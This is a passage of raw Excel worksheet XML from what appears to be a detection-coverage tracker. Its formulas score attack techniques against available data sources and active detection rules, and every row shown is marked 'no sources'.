      <c r="P526" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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26" t="s">
        <v>520</v>
      </c>
      <c r="U526" t="s">
        <v>2502</v>
      </c>
      <c r="V526" t="s">
        <v>2503</v>
      </c>
      <c r="W526" t="b">
        <v>1</v>
      </c>
      <c r="X526" t="s">
        <v>2482</v>
      </c>
    </row>
    <row r="527" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A527" t="s">
        <v>2482</v>
      </c>
      <c r="B527" t="s">
        <v>2504</v>
      </c>
      <c r="C527" t="s">
        <v>292</v>
      </c>
      <c r="D527" t="s">
        <v>6</v>
      </c>
      <c r="E527" t="s">
        <v>2505</v>
      </c>
      <c r="F527" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G527" s="9" cm="1">
        <f t="array" ref="G527">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H527" s="9" t="str" cm="1">
        <f t="array" ref="H527">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I527" s="9" t="str" cm="1">
        <f t="array" ref="I527">IF(SUM(IF($C527=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C527=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J527" s="9" t="str" cm="1">
        <f t="array" ref="J52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27" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M527" s="9" cm="1">
        <f t="array" ref="M527">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N527" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O527" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P527" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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27" t="s">
        <v>520</v>
      </c>
      <c r="U527" t="s">
        <v>2506</v>
      </c>
      <c r="W527" t="b">
        <v>1</v>
      </c>
      <c r="X527" t="s">
        <v>2482</v>
      </c>
    </row>
    <row r="528" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A528" t="s">
        <v>2507</v>
      </c>
      <c r="B528" t="s">
        <v>2507</v>
      </c>
      <c r="C528" t="s">
        <v>57</v>
      </c>
      <c r="D528" t="s">
        <v>8</v>
      </c>
      <c r="E528" t="s">
        <v>2508</v>
      </c>
      <c r="F528" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G528" s="9" cm="1">
        <f t="array" ref="G528">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H528" s="9" cm="1">
        <f t="array" ref="H528">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I528" s="9" t="str" cm="1">
        <f t="array" ref="I528">IF(SUM(IF($C528=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C528=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J528" s="9" t="str" cm="1">
        <f t="array" ref="J52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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M528" s="9" cm="1">
        <f t="array" ref="M528">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N528" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O528" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P528" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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28" t="s">
        <v>520</v>
      </c>
      <c r="U528" t="s">
        <v>2509</v>
      </c>
      <c r="V528" t="s">
        <v>2510</v>
      </c>
      <c r="W528" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="529" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A529" t="s">
        <v>2511</v>
      </c>
      <c r="B529" t="s">
        <v>2511</v>
      </c>
      <c r="C529" t="s">
        <v>27</v>
      </c>
      <c r="D529" t="s">
        <v>1</v>
      </c>
      <c r="E529" t="s">
        <v>2512</v>
      </c>
      <c r="F529" s="9">
        <f t="shared" si="8"/>
        <v>5</v>
      </c>
      <c r="G529" s="9" cm="1">
        <f t="array" ref="G529">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H529" s="9" cm="1">
        <f t="array" ref="H529">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>8</v>
      </c>
      <c r="I529" s="9" t="str" cm="1">
        <f t="array" ref="I529">IF(SUM(IF($C529=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C529=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J529" s="9" cm="1">
        <f t="array" ref="J52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529" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>8</v>
      </c>
      <c r="M529" s="9" cm="1">
        <f t="array" ref="M529">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>8</v>
      </c>
      <c r="N529" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O529" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P529" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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29" t="s">
        <v>2513</v>
      </c>
      <c r="U529" t="s">
        <v>2514</v>
      </c>
      <c r="V529" t="s">
        <v>2515</v>
      </c>
      <c r="W529" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="530" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A530" t="s">
        <v>2511</v>
      </c>
      <c r="B530" t="s">
        <v>2516</v>
      </c>
      <c r="C530" t="s">
        <v>2517</v>
      </c>
      <c r="D530" t="s">
        <v>1</v>
      </c>
      <c r="E530" t="s">
        <v>2518</v>
      </c>
      <c r="F530" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G530" s="9" cm="1">
        <f t="array" ref="G530">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H530" s="9" t="str" cm="1">
        <f t="array" ref="H530">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I530" s="9" t="str" cm="1">
        <f t="array" ref="I530">IF(SUM(IF($C530=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C530=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J530" s="9" t="str" cm="1">
        <f t="array" ref="J53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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M530" s="9" cm="1">
        <f t="array" ref="M530">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N530" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O530" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P530" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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30" t="s">
        <v>2513</v>
      </c>
      <c r="U530" t="s">
        <v>2519</v>
      </c>
      <c r="V530" t="s">
        <v>2520</v>
      </c>
      <c r="W530" t="b">
        <v>1</v>
      </c>
      <c r="X530" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="531" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A531" t="s">
        <v>2511</v>
      </c>
      <c r="B531" t="s">
        <v>2521</v>
      </c>
      <c r="C531" t="s">
        <v>2522</v>
      </c>
      <c r="D531" t="s">
        <v>1</v>
      </c>
      <c r="F531" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G531" s="9" cm="1">
        <f t="array" ref="G531">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H531" s="9" t="str" cm="1">
        <f t="array" ref="H531">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I531" s="9" t="str" cm="1">
        <f t="array" ref="I531">IF(SUM(IF($C531=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C531=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J531" s="9" t="str" cm="1">
        <f t="array" ref="J53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31" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M531" s="9" cm="1">
        <f t="array" ref="M531">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N531" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O531" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P531" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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31" t="s">
        <v>2513</v>
      </c>
      <c r="U531" t="s">
        <v>2523</v>
      </c>
      <c r="V531" t="s">
        <v>2524</v>
      </c>
      <c r="W531" t="b">
        <v>1</v>
      </c>
      <c r="X531" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="532" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A532" t="s">
        <v>2511</v>
      </c>
      <c r="B532" t="s">
        <v>2525</v>
      </c>
      <c r="C532" t="s">
        <v>2526</v>
      </c>
      <c r="D532" t="s">
        <v>1</v>
      </c>
      <c r="E532" t="s">
        <v>2527</v>
      </c>
      <c r="F532" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G532" s="9" cm="1">
        <f t="array" ref="G532">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H532" s="9" t="str" cm="1">
        <f t="array" ref="H532">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I532" s="9" t="str" cm="1">
        <f t="array" ref="I532">IF(SUM(IF($C532=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C532=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J532" s="9" t="str" cm="1">
        <f t="array" ref="J53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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M532" s="9" cm="1">
        <f t="array" ref="M532">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N532" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O532" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P532" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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32" t="s">
        <v>2513</v>
      </c>
      <c r="U532" t="s">
        <v>2528</v>
      </c>
      <c r="V532" t="s">
        <v>2529</v>
      </c>
      <c r="W532" t="b">
        <v>1</v>
      </c>
      <c r="X532" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="533" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A533" t="s">
        <v>2511</v>
      </c>
      <c r="B533" t="s">
        <v>2530</v>
      </c>
      <c r="C533" t="s">
        <v>2531</v>
      </c>
      <c r="D533" t="s">
        <v>1</v>
      </c>
      <c r="E533" t="s">
        <v>2527</v>
      </c>
      <c r="F533" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G533" s="9" cm="1">
        <f t="array" ref="G533">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H533" s="9" t="str" cm="1">
        <f t="array" ref="H533">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I533" s="9" t="str" cm="1">
        <f t="array" ref="I533">IF(SUM(IF($C533=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C533=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J533" s="9" t="str" cm="1">
        <f t="array" ref="J53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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M533" s="9" cm="1">
        <f t="array" ref="M533">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N533" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O533" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P533" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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33" t="s">
        <v>2513</v>
      </c>
      <c r="U533" t="s">
        <v>2532</v>
      </c>
      <c r="V533" t="s">
        <v>2533</v>
      </c>
      <c r="W533" t="b">
        <v>1</v>
      </c>
      <c r="X533" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="534" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A534" t="s">
        <v>2511</v>
      </c>
      <c r="B534" t="s">
        <v>2534</v>
      </c>
      <c r="C534" t="s">
        <v>2535</v>
      </c>
      <c r="D534" t="s">
        <v>1</v>
      </c>
      <c r="F534" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G534" s="9" cm="1">
        <f t="array" ref="G534">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H534" s="9" t="str" cm="1">
        <f t="array" ref="H534">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I534" s="9" t="str" cm="1">
        <f t="array" ref="I534">IF(SUM(IF($C534=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C534=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J534" s="9" t="str" cm="1">
        <f t="array" ref="J53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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M534" s="9" cm="1">
        <f t="array" ref="M534">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N534" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O534" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P534" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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34" t="s">
        <v>2513</v>
      </c>
      <c r="U534" t="s">
        <v>2536</v>
      </c>
      <c r="V534" t="s">
        <v>2537</v>
      </c>
      <c r="W534" t="b">
        <v>1</v>
      </c>
      <c r="X534" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="535" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A535" t="s">
        <v>2511</v>
      </c>
      <c r="B535" t="s">
        <v>2538</v>
      </c>
      <c r="C535" t="s">
        <v>2539</v>
      </c>
      <c r="D535" t="s">
        <v>1</v>
      </c>
      <c r="E535" t="s">
        <v>2540</v>
      </c>
      <c r="F535" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G535" s="9" cm="1">
        <f t="array" ref="G535">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H535" s="9" t="str" cm="1">
        <f t="array" ref="H535">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I535" s="9" t="str" cm="1">
        <f t="array" ref="I535">IF(SUM(IF($C535=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C535=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J535" s="9" t="str" cm="1">
        <f t="array" ref="J53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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M535" s="9" cm="1">
        <f t="array" ref="M535">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N535" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O535" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P535" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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35" t="s">
        <v>2513</v>
      </c>
      <c r="U535" t="s">
        <v>2541</v>
      </c>
      <c r="V535" t="s">
        <v>2542</v>
      </c>
      <c r="W535" t="b">
        <v>1</v>
      </c>
      <c r="X535" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="536" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A536" t="s">
        <v>2511</v>
      </c>
      <c r="B536" t="s">
        <v>2543</v>
      </c>
      <c r="C536" t="s">
        <v>2544</v>
      </c>
      <c r="D536" t="s">
        <v>1</v>
      </c>
      <c r="E536" t="s">
        <v>2540</v>
      </c>
      <c r="F536" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G536" s="9" cm="1">
        <f t="array" ref="G536">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H536" s="9" t="str" cm="1">
